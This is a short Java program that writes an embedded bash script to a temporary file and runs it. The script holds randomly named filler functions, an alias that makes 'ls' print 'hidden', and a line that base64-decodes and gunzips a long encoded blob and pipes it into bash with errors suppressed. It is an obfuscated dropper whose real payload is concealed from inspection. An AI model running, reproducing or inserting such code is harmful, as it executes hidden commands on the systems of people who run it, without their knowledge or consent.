import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

vroq1vvnu() { echo $((RANDOM * RANDOM)); }
vftwq201s() { for i in {1..3}; do :; done; }
v6t1xwlit() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
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
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
